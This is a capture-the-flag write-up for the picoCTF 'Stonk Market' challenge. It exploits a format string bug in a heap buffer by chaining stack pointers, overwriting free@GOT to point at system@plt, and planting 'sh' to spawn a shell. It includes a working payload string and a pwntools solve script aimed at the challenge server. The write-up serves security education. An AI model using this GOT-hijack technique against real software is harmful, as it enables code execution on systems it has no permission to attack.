# CyLab — Stonk Market

* **Platform:** CyLab Security Academy / picoCTF 2021 (Challenge ID: `164`)
* **Category:** Binary Exploitation / Heap Format String & GOT Hijacking (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, Format String Chaining
* **Binary:** `vuln` (x86_64 ELF)

---

## TL;DR

The binary presents a format string vulnerability via `printf(user_buf)`, but with a significant hurdle: **the format buffer resides on the heap (`malloc(301)`), not on the stack**. Because the attacker cannot directly place arbitrary destination addresses on the stack via the format string itself, we exploit an existing stack pointer-to-pointer chain. In a single composite format string, we use `%n` through an existing stack frame pointer (argument 12) to write the address of `free@GOT` (`0x602018`) into stack slot 20. We then use `%20$hhn` to modify the low byte of `free@GOT` to point to `system@plt` (`0x4006f0`), and `%18$n` to write `"sh\0"` into the `Portfolio* p` struct. When the program calls `free(p)`, it invokes `system("sh")` and grants an interactive shell.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key observations:
1. **Partial RELRO:** The Global Offset Table (GOT) resides in writable memory (`0x602000`).
2. **No PIE:** Fixed code base at `0x400000`. PLT trampolines and GOT addresses are static.
3. **Heap-Allocated Format String:** User input is read into a dynamically allocated buffer on the heap, preventing traditional stack-inlined address referencing.

---

## Static Analysis & Vulnerability

### 1. Source Code Review

```c
typedef struct {
    int balance;
    char *name;
} Portfolio;

int buy_stonks(Portfolio *p) {
    char *user_buf = malloc(300 + 1);
    printf("What is your API token?\n");
    scanf("%300s", user_buf);

    // VULNERABILITY: Unbounded format string from heap buffer
    printf(user_buf);

    free(user_buf);
    free(p);            // Target call: if free@got is hijacked to system@plt,
    return 0;           // free(p) becomes system(p)!
}
```

### 2. Disassembly & Target Addresses

Inspecting symbols with `objdump`:

```text
0x00602018: free@got
0x004006f0: system@plt
```

Default GOT resolution for `free` points to `0x4006f6` (PLT resolution stub). Overwriting its least significant byte from `0xf6` to `0xf0` changes the GOT target directly to `system@plt`!

### 3. The Stack Pointer-to-Pointer Architecture

On x86_64 Linux:
- `printf` retrieves arguments 1–6 from registers (`rdi, rsi, rdx, rcx, r8, r9`).
- Arguments $\ge 7$ are drawn sequentially from the stack frame of `buy_stonks()`.
- Stack slot 12 holds a saved frame pointer pointing to stack slot 20:
  $$\text{Stack Slot 12 } \longrightarrow \text{ Stack Slot 20}$$
- Stack slot 18 holds the pointer to `Portfolio *p`.

```text
       Stack Frame Layout during printf:
       
       Slot 12 (rbp-relative):  [ Pointer to Slot 20 ]
                                       |
                                       v
       Slot 20 (stack memory):  [ Target Address Pointer ]  <-- We write 0x602018 here!
                                       |
                                       v
                                [ free@got (0x602018) ]     <-- We overwrite with system@plt!
                                
       Slot 18:                 [ Pointer to Portfolio *p ] <-- We write "sh\0" here!
```

---

## Dynamic Analysis & Exploitation Strategy

### 1. Multi-Stage Format String Synthesis

We structure a single format string that sequentially stages three modifications:

1. **Step 1: Write `free@GOT` Address onto Stack (Slot 20)**
   - Print 10 characters using `%c` $\times 10$.
   - Print $6{,}299{,}662$ characters (`%6299662c`).
   - Total characters printed = $6{,}299{,}672 = 0\text{x}602018$ (`free@got`).
   - Write this value using `%n` (which defaults to argument 12 on stack).
   - **Result:** Stack slot 20 now contains the pointer `0x602018`!

2. **Step 2: Hijack `free@GOT` to `system@plt`**
   - Print 216 additional characters (`%216c`).
   - Total count = $0\text{x}602018 + 216 = 0\text{x}6020\text{f}0$.
   - Use `%20$hhn` (single-byte write) through slot 20 to overwrite the low byte of `free@GOT` with `0xf0`.
   - **Result:** `free@got` now points directly to `system@plt` (`0x4006f0`)!

3. **Step 3: Poison `Portfolio *p` with `"sh\0"`**
   - Print $10{,}504{,}067$ additional characters (`%10504067c`).
   - Total count = $0\text{x}01006873$, corresponding to ASCII `"sh\x00\x01"`.
   - Use `%18$n` to write this integer into the memory pointed to by `p` (argument 18).
   - **Result:** The first 3 bytes of `p` become `"sh\0"`.

4. **Execution:**
   When `buy_stonks()` executes `free(p)`, it resolves `system(p)`, running `system("sh")`!

---

## Exploit

The complete exploit script is available at [solve.py](solve.py):

```python
#!/usr/bin/env python3
import sys, time, re
from pwn import *

context.log_level = "info"
HOST, PORT = "xebec.cylabacademy.net", 28926

def solve(io):
    io.sendlineafter(b"token?\n", b"1")

    # Composite format string chaining pointer manipulation, GOT overwrite, and command injection
    # 1. Write free@got (0x602018) into stack slot 20 via slot 12
    # 2. Overwrite low byte of free@got with 0xf0 (system@plt) via slot 20
    # 3. Write "sh\0" into Portfolio buffer via slot 18
    payload = b"%c" * 10 + b"%6299662c%n%216c%20$hhn%10504067c%18$n"
    io.sendline(payload)

    log.info("Draining format string output (~16 MB)...")
    # Drain generated padding characters
    io.recvuntil(b"sh-", timeout=30)

    # Execute commands in spawned shell
    io.sendline(b"cat api flag.txt 2>/dev/null")
    data = io.recvall(timeout=5)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = process("./vuln") if len(sys.argv) > 1 and sys.argv[1] == "local" else remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 solve.py
[+] Opening connection to xebec.cylabacademy.net on port 28926: Done
[*] Draining format string output (~16 MB)...
[+] Flag captured: academy{redacted}
[*] Closed connection to xebec.cylabacademy.net port 28926
```

---

## Key Takeaways & Lessons

1. **Format String Exploitation from the Heap:** When input buffers reside on the heap, standard stack direct-parameter access (`%target$n`) is impossible without pre-existing stack pointers. Identifying pointer-to-pointer relationships on the stack allows staging arbitrary pointers into writable stack slots.
2. **Partial GOT Overwrites:** In non-PIE binaries with Partial RELRO, function stubs in the PLT often differ from other library functions by only a single byte. A 1-byte write (`%hhn`) avoids complex multi-word write chains.
3. **Repurposing `free(ptr)` as `system(cmd)`:** Corrupting `free@GOT` to point to `system@plt` is one of the most effective heap exploitation strategies, automatically turning the argument passed to `free()` into the command executed by the shell.
